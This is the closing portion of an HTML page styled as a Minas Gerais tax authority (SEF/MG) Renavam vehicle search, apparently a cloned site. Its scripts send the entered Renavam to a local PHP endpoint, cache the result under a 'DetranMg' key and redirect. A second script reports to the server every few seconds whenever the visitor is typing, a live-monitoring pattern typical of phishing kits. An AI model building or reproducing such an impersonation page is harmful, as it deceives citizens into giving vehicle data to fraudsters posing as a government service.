                                        class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-colorPrimary MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-colorPrimary css-xhpfbr"
                                        tabindex="0" type="button">
                                        <p class="MuiTypography-root MuiTypography-body1 css-1unyz00">Saiba mais</p>
                                        <span class="MuiTouchRipple-root css-w0pj6f"></span>
                                    </button>
                                </div>
                            </div>
                        </section>
                    </div>
                </div>
            </div>
        </main>
    </div>
  
   
    <next-route-announcer>
        <p aria-live="assertive" id="__next-route-announcer__" role="alert"
            style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;">
            Buscar Renavam - SEF/MG</p>
    </next-route-announcer>
   
<script>
// Seletores
const input = document.getElementById('outlined-basic');
const btn = document.querySelector('[data-testid="btn_pesquisar"]');
const form = input.closest('form');

input.addEventListener('input', function() {
        if (input.value.length > 5) {
            btn.removeAttribute('disabled');
            btn.classList.remove('Mui-disabled');
            btn.classList.add('css-cwhnqw');
            btn.tabIndex = 0;
        } else {
            btn.setAttribute('disabled', '');
            btn.classList.add('Mui-disabled');
            btn.classList.remove('css-cwhnqw');
            btn.tabIndex = -1;
        }
});

function showLoading() {
        const loader = document.createElement('div');
        loader.id = 'custom-loader-overlay';
        loader.innerHTML = `
            <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.35);z-index:9999;display:flex;align-items:center;justify-content:center;">
                <div style="background:#fff;padding:32px 48px;border-radius:16px;box-shadow:0 2px 16px rgba(0,0,0,0.2);font-size:1.5rem;font-family:sans-serif;display:flex;flex-direction:column;align-items:center;">
                    <div class="loader-spinner" style="border:6px solid #eee;border-top:6px solid #1351b4;border-radius:50%;width:48px;height:48px;animation:spin 1s linear infinite;margin-bottom:16px;"></div>
                    Aguarde, Carregando...
                </div>
            </div>
            <style>
                @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
            </style>
        `;
        document.body.appendChild(loader);
}

function hideLoading() {
        const loader = document.getElementById('custom-loader-overlay');
         if (loader) loader.remove();
}

function showErrorMessage(message) {
        const errorOverlay = document.createElement('div');
        errorOverlay.id = 'custom-error-overlay';
        errorOverlay.innerHTML = `
            <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.5);z-index:10000;display:flex;align-items:center;justify-content:center;">
                <div style="background:#fff;padding:32px 40px;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,0.15);font-family:'__openSans_9c6427', '__openSans_Fallback_9c6427';max-width:400px;text-align:center;">
                    <svg style="width:48px;height:48px;margin:0 auto 16px;color:#B81F25;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                    </svg>
                    <h2 style="margin:0 0 12px 0;font-size:1.25rem;font-weight:600;color:#333;">Atenção</h2>
                    <p style="margin:0 0 24px 0;font-size:1rem;color:#666;line-height:1.5;">${message}</p>
                    <button id="error-close-btn" style="background:#1351b4;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:1rem;font-weight:600;cursor:pointer;transition:background 0.3s;">
                        Fechar
                    </button>
                </div>
            </div>
        `;
        document.body.appendChild(errorOverlay);
        
        document.getElementById('error-close-btn').addEventListener('click', function() {
            errorOverlay.remove();
        });
        
        // Fechar ao clicar fora do modal
        errorOverlay.addEventListener('click', function(e) {
            if (e.target === errorOverlay) {
                errorOverlay.remove();
            }
        });
}

form.addEventListener('submit', function(e) {
    e.preventDefault();
    if (input.value.length > 5) {
        showLoading();
        fetch(`./api/BuscaMG.php?renavam=${input.value}`).then(response => response.json()).then(data => {
            hideLoading();
            
            if(data.IsStatus){
                localStorage.setItem("DetranMg", JSON.stringify(data.response));
                window.location.href = './?renavam='+input.value+"&sucesso=true";
            } else {
                showErrorMessage(data.response || 'Não foi possível processar sua solicitação. Tente novamente.');
            }
        }).catch(error => {
            hideLoading();
            console.error('Erro na requisição:', error);
            showErrorMessage('Erro ao conectar ao servidor. Verifique sua conexão e tente novamente.');
        });
    }
});
</script>

<script>

    var inputs = [
    document.getElementById('outlined-basic')
];

let typingTimer = null;
let notifyInterval = null;
const INACTIVITY_TIMEOUT = 3000; // 3 segundos sem digitar
const NOTIFY_INTERVAL = 5000; // notificar a cada 5s enquanto digitando

inputs.forEach(input => {
    input.addEventListener('input', (e) => {
        const value = e.target.value.trim();

        // Ao começar a digitar, envia notificação e inicia intervalos
        if (!notifyInterval) {
            notifyTyping();
            notifyInterval = setInterval(notifyTyping, NOTIFY_INTERVAL);
        }

        // Reinicia o timer de inatividade sempre que digita
        clearTimeout(typingTimer);
        typingTimer = setTimeout(() => {
            // Parou de digitar
            clearInterval(notifyInterval);
            notifyInterval = null;
        }, INACTIVITY_TIMEOUT);
    });
});

async function notifyTyping() {
    try {
        const response = await fetch('/api/typing_start.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ typing: true })
        });

        if (!response.ok) {
            console.error('Erro ao notificar typing:', response.status);
            return;
        }

        const data = await response.json();
        // Pode usar o `data` se necessário

    } catch (error) {
        console.error('Erro na requisição typing_start.php:', error);
    }
}


</script>

</body>
</html>